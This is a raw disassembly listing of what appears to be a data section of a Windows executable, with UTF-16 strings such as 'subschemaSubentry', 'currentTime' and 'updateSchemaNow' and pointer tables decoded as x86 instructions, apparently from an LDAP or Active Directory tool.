  40361e:	00 00                	add    %al,(%eax)
  403620:	32 00                	xor    (%eax),%al
  403622:	2e 00 35 00 2e 00 35 	add    %dh,%cs:0x35002e00
  403629:	00 2e                	add    %ch,(%esi)
  40362b:	00 31                	add    %dh,(%ecx)
  40362d:	00 00                	add    %al,(%eax)
  40362f:	00 73 00             	add    %dh,0x0(%ebx)
  403632:	75 00                	jne    0x403634
  403634:	62 00                	bound  %eax,(%eax)
  403636:	73 00                	jae    0x403638
  403638:	63 00                	arpl   %eax,(%eax)
  40363a:	68 00 65 00 6d       	push   $0x6d006500
  40363f:	00 61 00             	add    %ah,0x0(%ecx)
  403642:	53                   	push   %ebx
  403643:	00 75 00             	add    %dh,0x0(%ebp)
  403646:	62 00                	bound  %eax,(%eax)
  403648:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40364c:	74 00                	je     0x40364e
  40364e:	72 00                	jb     0x403650
  403650:	79 00                	jns    0x403652
  403652:	00 00                	add    %al,(%eax)
  403654:	32 00                	xor    (%eax),%al
  403656:	2e 00 35 00 2e 00 35 	add    %dh,%cs:0x35002e00
  40365d:	00 2e                	add    %ch,(%esi)
  40365f:	00 31                	add    %dh,(%ecx)
  403661:	00 31                	add    %dh,(%ecx)
  403663:	00 00                	add    %al,(%eax)
  403665:	00 00                	add    %al,(%eax)
  403667:	00 63 00             	add    %ah,0x0(%ebx)
  40366a:	75 00                	jne    0x40366c
  40366c:	72 00                	jb     0x40366e
  40366e:	72 00                	jb     0x403670
  403670:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403674:	74 00                	je     0x403676
  403676:	54                   	push   %esp
  403677:	00 69 00             	add    %ch,0x0(%ecx)
  40367a:	6d                   	insl   (%dx),%es:(%edi)
  40367b:	00 65 00             	add    %ah,0x0(%ebp)
  40367e:	00 00                	add    %al,(%eax)
  403680:	91                   	xchg   %eax,%ecx
  403681:	80 94 a9 ff 69 00 4c 	adcb   $0xbe,0x4c0069ff(%ecx,%ebp,4)
  403688:	be 
  403689:	92                   	xchg   %eax,%edx
  40368a:	92                   	xchg   %eax,%edx
  40368b:	5d                   	pop    %ebp
  40368c:	42                   	inc    %edx
  40368d:	e0 ad                	loopne 0x40363c
  40368f:	39 12                	cmp    %edx,(%edx)
  403691:	6f                   	outsl  %ds:(%esi),(%dx)
  403692:	43                   	inc    %ebx
  403693:	c7                   	(bad)
  403694:	7f a2                	jg     0x403638
  403696:	ab                   	stos   %eax,%es:(%edi)
  403697:	4c                   	dec    %esp
  403698:	aa                   	stos   %al,%es:(%edi)
  403699:	ca 2b d2             	lret   $0xd22b
  40369c:	7e d1                	jle    0x40366f
  40369e:	b7 73                	mov    $0x73,%bh
  4036a0:	10 82 40 00 06 3d    	adc    %al,0x3d060040(%edx)
  4036a6:	41                   	inc    %ecx
  4036a7:	00 68 b2             	add    %ch,-0x4e(%eax)
  4036aa:	41                   	inc    %ecx
  4036ab:	00 b0 3d 41 00 2a    	add    %dh,0x2a00413d(%eax)
  4036b1:	48                   	dec    %eax
  4036b2:	41                   	inc    %ecx
  4036b3:	00 00                	add    %al,(%eax)
  4036b5:	3d 41 00 eb 34       	cmp    $0x34eb0041,%eax
  4036ba:	41                   	inc    %ecx
  4036bb:	00 00                	add    %al,(%eax)
  4036bd:	00 00                	add    %al,(%eax)
  4036bf:	00 84 82 40 00 52 08 	add    %al,0x8520040(%edx,%eax,4)
  4036c6:	43                   	inc    %ebx
  4036c7:	00 31                	add    %dh,(%ecx)
  4036c9:	44                   	inc    %esp
  4036ca:	41                   	inc    %ecx
  4036cb:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  4036d2:	41                   	inc    %ecx
  4036d3:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  4036da:	43                   	inc    %ebx
  4036db:	00 30                	add    %dh,(%eax)
  4036dd:	06                   	push   %es
  4036de:	43                   	inc    %ebx
  4036df:	00 2a                	add    %ch,(%edx)
  4036e1:	06                   	push   %es
  4036e2:	43                   	inc    %ebx
  4036e3:	00 24 06             	add    %ah,(%esi,%eax,1)
  4036e6:	43                   	inc    %ebx
  4036e7:	00 1e                	add    %bl,(%esi)
  4036e9:	06                   	push   %es
  4036ea:	43                   	inc    %ebx
  4036eb:	00 18                	add    %bl,(%eax)
  4036ed:	06                   	push   %es
  4036ee:	43                   	inc    %ebx
  4036ef:	00 12                	add    %dl,(%edx)
  4036f1:	06                   	push   %es
  4036f2:	43                   	inc    %ebx
  4036f3:	00 f2                	add    %dh,%dl
  4036f5:	34 41                	xor    $0x41,%al
  4036f7:	00 0c 06             	add    %cl,(%esi,%eax,1)
  4036fa:	43                   	inc    %ebx
  4036fb:	00 06                	add    %al,(%esi)
  4036fd:	06                   	push   %es
  4036fe:	43                   	inc    %ebx
  4036ff:	00 00                	add    %al,(%eax)
  403701:	06                   	push   %es
  403702:	43                   	inc    %ebx
  403703:	00 fa                	add    %bh,%dl
  403705:	05 43 00 f4 05       	add    $0x5f40043,%eax
  40370a:	43                   	inc    %ebx
  40370b:	00 ee                	add    %ch,%dh
  40370d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  403712:	43                   	inc    %ebx
  403713:	00 e2                	add    %ah,%dl
  403715:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  40371a:	43                   	inc    %ebx
  40371b:	00 d6                	add    %dl,%dh
  40371d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  403722:	43                   	inc    %ebx
  403723:	00 ca                	add    %cl,%dl
  403725:	05 43 00 c4 05       	add    $0x5c40043,%eax
  40372a:	43                   	inc    %ebx
  40372b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  403731:	05 43 00 b2 05       	add    $0x5b20043,%eax
  403736:	43                   	inc    %ebx
  403737:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  40373e:	43                   	inc    %ebx
  40373f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  403745:	05 43 00 29 b5       	add    $0xb5290043,%eax
  40374a:	41                   	inc    %ecx
  40374b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  403751:	60                   	pusha
  403752:	41                   	inc    %ecx
  403753:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  403759:	a9 40 00 46 08       	test   $0x8460040,%eax
  40375e:	43                   	inc    %ebx
  40375f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  403765:	05 43 00 76 05       	add    $0x5760043,%eax
  40376a:	43                   	inc    %ebx
  40376b:	00 70 05             	add    %dh,0x5(%eax)
  40376e:	43                   	inc    %ebx
  40376f:	00 6a 05             	add    %ch,0x5(%edx)
  403772:	43                   	inc    %ebx
  403773:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  403779:	06                   	push   %es
  40377a:	43                   	inc    %ebx
  40377b:	00 58 05             	add    %bl,0x5(%eax)
  40377e:	43                   	inc    %ebx
  40377f:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  403785:	06                   	push   %es
  403786:	43                   	inc    %ebx
  403787:	00 49 3e             	add    %cl,0x3e(%ecx)
  40378a:	41                   	inc    %ecx
  40378b:	00 78 06             	add    %bh,0x6(%eax)
  40378e:	43                   	inc    %ebx
  40378f:	00 40 08             	add    %al,0x8(%eax)
  403792:	43                   	inc    %ebx
  403793:	00 08                	add    %cl,(%eax)
  403795:	43                   	inc    %ebx
  403796:	41                   	inc    %ecx
  403797:	00 66 06             	add    %ah,0x6(%esi)
  40379a:	43                   	inc    %ebx
  40379b:	00 ac 42 41 00 34 08 	add    %ch,0x8340041(%edx,%eax,2)
  4037a2:	43                   	inc    %ebx
  4037a3:	00 2e                	add    %ch,(%esi)
  4037a5:	08 43 00             	or     %al,0x0(%ebx)
  4037a8:	28 08                	sub    %cl,(%eax)
  4037aa:	43                   	inc    %ebx
  4037ab:	00 22                	add    %ah,(%edx)
  4037ad:	08 43 00             	or     %al,0x0(%ebx)
  4037b0:	1c 08                	sbb    $0x8,%al
  4037b2:	43                   	inc    %ebx
  4037b3:	00 16                	add    %dl,(%esi)
  4037b5:	08 43 00             	or     %al,0x0(%ebx)
  4037b8:	10 08                	adc    %cl,(%eax)
  4037ba:	43                   	inc    %ebx
  4037bb:	00 5f b4             	add    %bl,-0x4c(%edi)
  4037be:	41                   	inc    %ecx
  4037bf:	00 30                	add    %dh,(%eax)
  4037c1:	44                   	inc    %esp
  4037c2:	41                   	inc    %ecx
  4037c3:	00 6d 46             	add    %ch,0x46(%ebp)
  4037c6:	41                   	inc    %ecx
  4037c7:	00 30                	add    %dh,(%eax)
  4037c9:	44                   	inc    %esp
  4037ca:	41                   	inc    %ecx
  4037cb:	00 30                	add    %dh,(%eax)
  4037cd:	44                   	inc    %esp
  4037ce:	41                   	inc    %ecx
  4037cf:	00 d7                	add    %dl,%bh
  4037d1:	61                   	popa
  4037d2:	41                   	inc    %ecx
  4037d3:	00 8c b5 41 00 cc 82 	add    %cl,-0x7d33ffbf(%ebp,%esi,4)
  4037da:	40                   	inc    %eax
  4037db:	00 a5 45 41 00 68    	add    %ah,0x68004145(%ebp)
  4037e1:	b2 41                	mov    $0x41,%dl
  4037e3:	00 6d 46             	add    %ch,0x46(%ebp)
  4037e6:	41                   	inc    %ecx
  4037e7:	00 2a                	add    %ch,(%edx)
  4037e9:	48                   	dec    %eax
  4037ea:	41                   	inc    %ecx
  4037eb:	00 00                	add    %al,(%eax)
  4037ed:	3d 41 00 9e 45       	cmp    $0x459e0041,%eax
  4037f2:	41                   	inc    %ecx
  4037f3:	00 03                	add    %al,(%ebx)
  4037f5:	52                   	push   %edx
  4037f6:	22 5c f7 cf          	and    -0x31(%edi,%esi,8),%bl
  4037fa:	d2 11                	rclb   %cl,(%ecx)
  4037fc:	88 01                	mov    %al,(%ecx)
  4037fe:	00 c0                	add    %al,%al
  403800:	4f                   	dec    %edi
  403801:	72 ed                	jb     0x4037f0
  403803:	31 10                	xor    %edx,(%eax)
  403805:	83 40 00 06          	addl   $0x6,0x0(%eax)
  403809:	46                   	inc    %esi
  40380a:	41                   	inc    %ecx
  40380b:	00 00                	add    %al,(%eax)
  40380d:	00 00                	add    %al,(%eax)
  40380f:	00 58 83             	add    %bl,-0x7d(%eax)
  403812:	40                   	inc    %eax
  403813:	00 cf                	add    %cl,%bh
  403815:	46                   	inc    %esi
  403816:	41                   	inc    %ecx
  403817:	00 59 46             	add    %bl,0x46(%ecx)
  40381a:	41                   	inc    %ecx
  40381b:	00 5d 46             	add    %bl,0x46(%ebp)
  40381e:	41                   	inc    %ecx
  40381f:	00 d7                	add    %dl,%bh
  403821:	61                   	popa
  403822:	41                   	inc    %ecx
  403823:	00 65 46             	add    %ah,0x46(%ebp)
  403826:	41                   	inc    %ecx
  403827:	00 65 46             	add    %ah,0x46(%ebp)
  40382a:	41                   	inc    %ecx
  40382b:	00 1f                	add    %bl,(%edi)
  40382d:	be 41 00 ff f4       	mov    $0xf4ff0041,%esi
  403832:	41                   	inc    %ecx
  403833:	00 42 be             	add    %al,-0x42(%edx)
  403836:	41                   	inc    %ecx
  403837:	00 d7                	add    %dl,%bh
  403839:	61                   	popa
  40383a:	41                   	inc    %ecx
  40383b:	00 e6                	add    %ah,%dh
  40383d:	06                   	push   %es
  40383e:	42                   	inc    %edx
  40383f:	00 c9                	add    %cl,%cl
  403841:	46                   	inc    %esi
  403842:	41                   	inc    %ecx
  403843:	00 8a 0d 43 00 6d    	add    %cl,0x6d00430d(%edx)
  403849:	46                   	inc    %esi
  40384a:	41                   	inc    %ecx
  40384b:	00 72 46             	add    %dh,0x46(%edx)
  40384e:	41                   	inc    %ecx
  40384f:	00 8b d9 41 00 72    	add    %cl,0x720041d9(%ebx)
  403855:	46                   	inc    %esi
  403856:	41                   	inc    %ecx
  403857:	00 9c be 41 00 c5 be 	add    %bl,-0x413affbf(%esi,%edi,4)
  40385e:	41                   	inc    %ecx
  40385f:	00 6d 46             	add    %ch,0x46(%ebp)
  403862:	41                   	inc    %ecx
  403863:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403869:	be 41 00 8d be       	mov    $0xbe8d0041,%esi
  40386e:	41                   	inc    %ecx
  40386f:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403875:	be 41 00 8d be       	mov    $0xbe8d0041,%esi
  40387a:	41                   	inc    %ecx
  40387b:	00 8d be 41 00 d7    	add    %cl,-0x28ffbe42(%ebp)
  403881:	61                   	popa
  403882:	41                   	inc    %ecx
  403883:	00 7b be             	add    %bh,-0x42(%ebx)
  403886:	41                   	inc    %ecx
  403887:	00 8d be 41 00 77    	add    %cl,0x770041be(%ebp)
  40388d:	46                   	inc    %esi
  40388e:	41                   	inc    %ecx
  40388f:	00 5d 07             	add    %bl,0x7(%ebp)
  403892:	42                   	inc    %edx
  403893:	00 94 c1 41 00 5b c0 	add    %dl,-0x3fa4ffbf(%ecx,%eax,8)
  40389a:	41                   	inc    %ecx
  40389b:	00 6e c0             	add    %ch,-0x40(%esi)
  40389e:	41                   	inc    %ecx
  40389f:	00 7f 46             	add    %bh,0x46(%edi)
  4038a2:	41                   	inc    %ecx
  4038a3:	00 8a 0d 43 00 8a    	add    %cl,-0x75ffbcf3(%edx)
  4038a9:	0d 43 00 30 44       	or     $0x44300043,%eax
  4038ae:	41                   	inc    %ecx
  4038af:	00 d7                	add    %dl,%bh
  4038b1:	61                   	popa
  4038b2:	41                   	inc    %ecx
  4038b3:	00 c9                	add    %cl,%cl
  4038b5:	46                   	inc    %esi
  4038b6:	41                   	inc    %ecx
  4038b7:	00 00                	add    %al,(%eax)
  4038b9:	be 41 00 00 00       	mov    $0x41,%esi
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	ac                   	lods   %ds:(%esi),%al
  4038c1:	83 40 00 a8          	addl   $0xffffffa8,0x0(%eax)
  4038c5:	06                   	push   %es
  4038c6:	43                   	inc    %ebx
  4038c7:	00 ac 47 41 00 94 60 	add    %ch,0x60940041(%edi,%eax,2)
  4038ce:	41                   	inc    %ecx
  4038cf:	00 30                	add    %dh,(%eax)
  4038d1:	44                   	inc    %esp
  4038d2:	41                   	inc    %ecx
  4038d3:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  4038da:	43                   	inc    %ebx
  4038db:	00 30                	add    %dh,(%eax)
  4038dd:	06                   	push   %es
  4038de:	43                   	inc    %ebx
  4038df:	00 2a                	add    %ch,(%edx)
  4038e1:	06                   	push   %es
  4038e2:	43                   	inc    %ebx
  4038e3:	00 24 06             	add    %ah,(%esi,%eax,1)
  4038e6:	43                   	inc    %ebx
  4038e7:	00 1e                	add    %bl,(%esi)
  4038e9:	06                   	push   %es
  4038ea:	43                   	inc    %ebx
  4038eb:	00 18                	add    %bl,(%eax)
  4038ed:	06                   	push   %es
  4038ee:	43                   	inc    %ebx
  4038ef:	00 12                	add    %dl,(%edx)
  4038f1:	06                   	push   %es
  4038f2:	43                   	inc    %ebx
  4038f3:	00 d9                	add    %bl,%cl
  4038f5:	fa                   	cli
  4038f6:	42                   	inc    %edx
  4038f7:	00 0c 06             	add    %cl,(%esi,%eax,1)
  4038fa:	43                   	inc    %ebx
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	06                   	push   %es
  4038fe:	43                   	inc    %ebx
  4038ff:	00 00                	add    %al,(%eax)
  403901:	06                   	push   %es
  403902:	43                   	inc    %ebx
  403903:	00 fa                	add    %bh,%dl
  403905:	05 43 00 f4 05       	add    $0x5f40043,%eax
  40390a:	43                   	inc    %ebx
  40390b:	00 ee                	add    %ch,%dh
  40390d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  403912:	43                   	inc    %ebx
  403913:	00 e2                	add    %ah,%dl
  403915:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  40391a:	43                   	inc    %ebx
  40391b:	00 d6                	add    %dl,%dh
  40391d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  403922:	43                   	inc    %ebx
  403923:	00 ca                	add    %cl,%dl
  403925:	05 43 00 c4 05       	add    $0x5c40043,%eax
  40392a:	43                   	inc    %ebx
  40392b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  403931:	05 43 00 b2 05       	add    $0x5b20043,%eax
  403936:	43                   	inc    %ebx
  403937:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  40393e:	43                   	inc    %ebx
  40393f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  403945:	05 43 00 94 05       	add    $0x5940043,%eax
  40394a:	43                   	inc    %ebx
  40394b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  403951:	60                   	pusha
  403952:	41                   	inc    %ecx
  403953:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  403959:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  40395e:	43                   	inc    %ebx
  40395f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  403965:	05 43 00 76 05       	add    $0x5760043,%eax
  40396a:	43                   	inc    %ebx
  40396b:	00 70 05             	add    %dh,0x5(%eax)
  40396e:	43                   	inc    %ebx
  40396f:	00 6a 05             	add    %ch,0x5(%edx)
  403972:	43                   	inc    %ebx
  403973:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  403979:	06                   	push   %es
  40397a:	43                   	inc    %ebx
  40397b:	00 58 05             	add    %bl,0x5(%eax)
  40397e:	43                   	inc    %ebx
  40397f:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  403985:	06                   	push   %es
  403986:	43                   	inc    %ebx
  403987:	00 df                	add    %bl,%bh
  403989:	fa                   	cli
  40398a:	42                   	inc    %edx
  40398b:	00 78 06             	add    %bh,0x6(%eax)
  40398e:	43                   	inc    %ebx
  40398f:	00 67 fc             	add    %ah,-0x4(%edi)
  403992:	42                   	inc    %edx
  403993:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  403997:	00 66 06             	add    %ah,0x6(%esi)
  40399a:	43                   	inc    %ebx
  40399b:	00 38                	add    %bh,(%eax)
  40399d:	ff 42 00             	incl   0x0(%edx)
  4039a0:	30 84 40 00 bd 48 41 	xor    %al,0x4148bd00(%eax,%eax,2)
  4039a7:	00 59 46             	add    %bl,0x46(%ecx)
  4039aa:	41                   	inc    %ecx
  4039ab:	00 5d 46             	add    %bl,0x46(%ebp)
  4039ae:	41                   	inc    %ecx
  4039af:	00 2d 48 41 00 65    	add    %ch,0x65004148
  4039b5:	46                   	inc    %esi
  4039b6:	41                   	inc    %ecx
  4039b7:	00 65 46             	add    %ah,0x46(%ebp)
  4039ba:	41                   	inc    %ecx
  4039bb:	00 1f                	add    %bl,(%edi)
  4039bd:	be 41 00 ff f4       	mov    $0xf4ff0041,%esi
  4039c2:	41                   	inc    %ecx
  4039c3:	00 57 da             	add    %dl,-0x26(%edi)
  4039c6:	41                   	inc    %ecx
  4039c7:	00 d7                	add    %dl,%bh
  4039c9:	61                   	popa
  4039ca:	41                   	inc    %ecx
  4039cb:	00 e6                	add    %ah,%dh
  4039cd:	06                   	push   %es
  4039ce:	42                   	inc    %edx
  4039cf:	00 ce                	add    %cl,%dh
  4039d1:	b2 42                	mov    $0x42,%dl
  4039d3:	00 ce                	add    %cl,%dh
  4039d5:	9c                   	pushf
  4039d6:	42                   	inc    %edx
  4039d7:	00 00                	add    %al,(%eax)
  4039d9:	08 42 00             	or     %al,0x0(%edx)
  4039dc:	76 7f                	jbe    0x403a5d
  4039de:	42                   	inc    %edx
  4039df:	00 8b d9 41 00 72    	add    %cl,0x720041d9(%ebx)
  4039e5:	46                   	inc    %esi
  4039e6:	41                   	inc    %ecx
  4039e7:	00 9c be 41 00 c5 be 	add    %bl,-0x413affbf(%esi,%edi,4)
  4039ee:	41                   	inc    %ecx
  4039ef:	00 6d 46             	add    %ch,0x46(%ebp)
  4039f2:	41                   	inc    %ecx
  4039f3:	00 43 80             	add    %al,-0x80(%ebx)
  4039f6:	42                   	inc    %edx
  4039f7:	00 15 9a 42 00 3e    	add    %dl,0x3e00429a
  4039fd:	85 42 00             	test   %eax,0x0(%edx)
  403a00:	8d be 41 00 8d be    	lea    -0x4172ffbf(%esi),%edi
  403a06:	41                   	inc    %ecx
  403a07:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403a0d:	be 41 00 d7 61       	mov    $0x61d70041,%esi
  403a12:	41                   	inc    %ecx
  403a13:	00 7b be             	add    %bh,-0x42(%ebx)
  403a16:	41                   	inc    %ecx
  403a17:	00 cb                	add    %cl,%bl
  403a19:	a0 42 00 e7 a0       	mov    0xa0e70042,%al
  403a1e:	42                   	inc    %edx
  403a1f:	00 5d 07             	add    %bl,0x7(%ebp)
  403a22:	42                   	inc    %edx
  403a23:	00 00                	add    %al,(%eax)
  403a25:	8c 42 00             	mov    %es,0x0(%edx)
  403a28:	5b                   	pop    %ebx
  403a29:	c0 41 00 6e          	rolb   $0x6e,0x0(%ecx)
  403a2d:	c0 41 00 4f          	rolb   $0x4f,0x0(%ecx)
  403a31:	4f                   	dec    %edi
  403a32:	41                   	inc    %ecx
  403a33:	00 78 80             	add    %bh,-0x80(%eax)
  403a36:	42                   	inc    %edx
  403a37:	00 4d 84             	add    %cl,-0x7c(%ebp)
  403a3a:	42                   	inc    %edx
  403a3b:	00 30                	add    %dh,(%eax)
  403a3d:	44                   	inc    %esp
  403a3e:	41                   	inc    %ecx
  403a3f:	00 40 48             	add    %al,0x48(%eax)
  403a42:	41                   	inc    %ecx
  403a43:	00 63 81             	add    %ah,-0x7f(%ebx)
  403a46:	42                   	inc    %edx
  403a47:	00 00                	add    %al,(%eax)
  403a49:	be 41 00 9b 0b       	mov    $0xb9b0041,%esi
  403a4e:	42                   	inc    %edx
  403a4f:	00 af ba 42 00 b1    	add    %ch,-0x4effbd46(%edi)
  403a55:	48                   	dec    %eax
  403a56:	41                   	inc    %ecx
  403a57:	00 fb                	add    %bh,%bl
  403a59:	c0 41 00 77          	rolb   $0x77,0x0(%ecx)
  403a5d:	46                   	inc    %esi
  403a5e:	41                   	inc    %ecx
  403a5f:	00 2a                	add    %ch,(%edx)
  403a61:	48                   	dec    %eax
  403a62:	41                   	inc    %ecx
  403a63:	00 d3                	add    %dl,%bl
  403a65:	49                   	dec    %ecx
  403a66:	41                   	inc    %ecx
  403a67:	00 49 48             	add    %cl,0x48(%ecx)
  403a6a:	41                   	inc    %ecx
  403a6b:	00 ae b9 42 00 53    	add    %ch,0x530042b9(%esi)
  403a71:	f0 41                	lock inc %ecx
  403a73:	00 05 c3 41 00 c2    	add    %al,0xc20041c3
  403a79:	00 42 00             	add    %al,0x0(%edx)
  403a7c:	ab                   	stos   %eax,%es:(%edi)
  403a7d:	69 42 00 74 84 42 00 	imul   $0x428474,0x0(%edx),%eax
  403a84:	da 95 42 00 ca 7f    	ficoml 0x7fca0042(%ebp)
  403a8a:	42                   	inc    %edx
  403a8b:	00 ab bd 42 00 23    	add    %ch,0x230042bd(%ebx)
  403a91:	bf 42 00 33 48       	mov    $0x48330042,%edi
  403a96:	41                   	inc    %ecx
  403a97:	00 7e 9a             	add    %bh,-0x66(%esi)
  403a9a:	42                   	inc    %edx
  403a9b:	00 49 9e             	add    %cl,-0x62(%ecx)
  403a9e:	42                   	inc    %edx
  403a9f:	00 4f a0             	add    %cl,-0x60(%edi)
  403aa2:	42                   	inc    %edx
  403aa3:	00 ad b8 42 00 ad    	add    %ch,-0x52ffbd48(%ebp)
  403aa9:	48                   	dec    %eax
  403aaa:	41                   	inc    %ecx
  403aab:	00 a7 72 42 00 b4    	add    %ah,-0x4bffbd8e(%edi)
  403ab1:	84 40 00             	test   %al,0x0(%eax)
  403ab4:	2a 09                	sub    (%ecx),%cl
  403ab6:	43                   	inc    %ebx
  403ab7:	00 2e                	add    %ch,(%esi)
  403ab9:	4f                   	dec    %edi
  403aba:	41                   	inc    %ecx
  403abb:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  403ac2:	41                   	inc    %ecx
  403ac3:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  403aca:	43                   	inc    %ebx
  403acb:	00 24 09             	add    %ah,(%ecx,%ecx,1)
  403ace:	43                   	inc    %ebx
  403acf:	00 2a                	add    %ch,(%edx)
  403ad1:	06                   	push   %es
  403ad2:	43                   	inc    %ebx
  403ad3:	00 24 06             	add    %ah,(%esi,%eax,1)
  403ad6:	43                   	inc    %ebx
  403ad7:	00 1e                	add    %bl,(%esi)
  403ad9:	06                   	push   %es
  403ada:	43                   	inc    %ebx
  403adb:	00 18                	add    %bl,(%eax)
  403add:	06                   	push   %es
  403ade:	43                   	inc    %ebx
  403adf:	00 12                	add    %dl,(%edx)
  403ae1:	06                   	push   %es
  403ae2:	43                   	inc    %ebx
  403ae3:	00 1e                	add    %bl,(%esi)
  403ae5:	09 43 00             	or     %eax,0x0(%ebx)
  403ae8:	0c 06                	or     $0x6,%al
  403aea:	43                   	inc    %ebx
  403aeb:	00 06                	add    %al,(%esi)
  403aed:	06                   	push   %es
  403aee:	43                   	inc    %ebx
  403aef:	00 00                	add    %al,(%eax)
  403af1:	06                   	push   %es
  403af2:	43                   	inc    %ebx
  403af3:	00 fa                	add    %bh,%dl
  403af5:	05 43 00 f4 05       	add    $0x5f40043,%eax
  403afa:	43                   	inc    %ebx
  403afb:	00 ee                	add    %ch,%dh
  403afd:	05 43 00 e8 05       	add    $0x5e80043,%eax
  403b02:	43                   	inc    %ebx
  403b03:	00 e2                	add    %ah,%dl
  403b05:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  403b0a:	43                   	inc    %ebx
  403b0b:	00 8a 48 41 00 0f    	add    %cl,0xf004148(%edx)
  403b11:	e3 41                	jecxz  0x403b54
  403b13:	00 18                	add    %bl,(%eax)
  403b15:	09 43 00             	or     %eax,0x0(%ebx)
  403b18:	12 09                	adc    (%ecx),%cl
  403b1a:	43                   	inc    %ebx
  403b1b:	00 0c 09             	add    %cl,(%ecx,%ecx,1)
  403b1e:	43                   	inc    %ebx
  403b1f:	00 06                	add    %al,(%esi)
  403b21:	09 43 00             	or     %eax,0x0(%ebx)
  403b24:	9c                   	pushf
  403b25:	48                   	dec    %eax
  403b26:	41                   	inc    %ecx
  403b27:	00 00                	add    %al,(%eax)
  403b29:	09 43 00             	or     %eax,0x0(%ebx)
  403b2c:	fa                   	cli
  403b2d:	08 43 00             	or     %al,0x0(%ebx)
  403b30:	f4                   	hlt
  403b31:	08 43 00             	or     %al,0x0(%ebx)
  403b34:	ee                   	out    %al,(%dx)
  403b35:	08 43 00             	or     %al,0x0(%ebx)
  403b38:	5d                   	pop    %ebp
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 20                	add    %ah,(%eax)
  403b3d:	00 5b 00             	add    %bl,0x0(%ebx)
  403b40:	00 00                	add    %al,(%eax)
  403b42:	00 00                	add    %al,(%eax)
  403b44:	fc                   	cld
  403b45:	84 40 00             	test   %al,0x0(%eax)
  403b48:	16                   	push   %ss
  403b49:	05 43 00 1f 58       	add    $0x581f0043,%eax
  403b4e:	41                   	inc    %ecx
  403b4f:	00 1a                	add    %bl,(%edx)
  403b51:	62 41 00             	bound  %eax,0x0(%ecx)
  403b54:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  403b58:	94                   	xchg   %eax,%esp
  403b59:	60                   	pusha
  403b5a:	41                   	inc    %ecx
  403b5b:	00 44 85 40          	add    %al,0x40(%ebp,%eax,4)
  403b5f:	00 16                	add    %dl,(%esi)
  403b61:	05 43 00 3b 58       	add    $0x583b0043,%eax
  403b66:	41                   	inc    %ecx
  403b67:	00 93 66 41 00 30    	add    %dl,0x30004166(%ebx)
  403b6d:	44                   	inc    %esp
  403b6e:	41                   	inc    %ecx
  403b6f:	00 94 60 41 00 8c 85 	add    %dl,-0x7a73ffbf(%eax,%eiz,2)
  403b76:	40                   	inc    %eax
  403b77:	00 16                	add    %dl,(%esi)
  403b79:	05 43 00 8a 53       	add    $0x538a0043,%eax
  403b7e:	41                   	inc    %ecx
  403b7f:	00 1a                	add    %bl,(%edx)
  403b81:	62 41 00             	bound  %eax,0x0(%ecx)
  403b84:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  403b88:	94                   	xchg   %eax,%esp
  403b89:	60                   	pusha
  403b8a:	41                   	inc    %ecx
  403b8b:	00 25 00 64 00 20    	add    %ah,0x20006400
  403b91:	00 4f 00             	add    %cl,0x0(%edi)
  403b94:	62 00                	bound  %eax,(%eax)
  403b96:	6a 00                	push   $0x0
  403b98:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  403b9c:	74 00                	je     0x403b9e
  403b9e:	28 00                	sub    %al,(%eax)
  403ba0:	73 00                	jae    0x403ba2
  403ba2:	29 00                	sub    %eax,(%eax)
  403ba4:	00 00                	add    %al,(%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	75 00                	jne    0x403baa
  403baa:	70 00                	jo     0x403bac
  403bac:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  403bb0:	74 00                	je     0x403bb2
  403bb2:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  403bb6:	63 00                	arpl   %eax,(%eax)
  403bb8:	68 00 65 00 6d       	push   $0x6d006500
  403bbd:	00 61 00             	add    %ah,0x0(%ecx)
  403bc0:	4e                   	dec    %esi
  403bc1:	00 6f 00             	add    %ch,0x0(%edi)
  403bc4:	77 00                	ja     0x403bc6
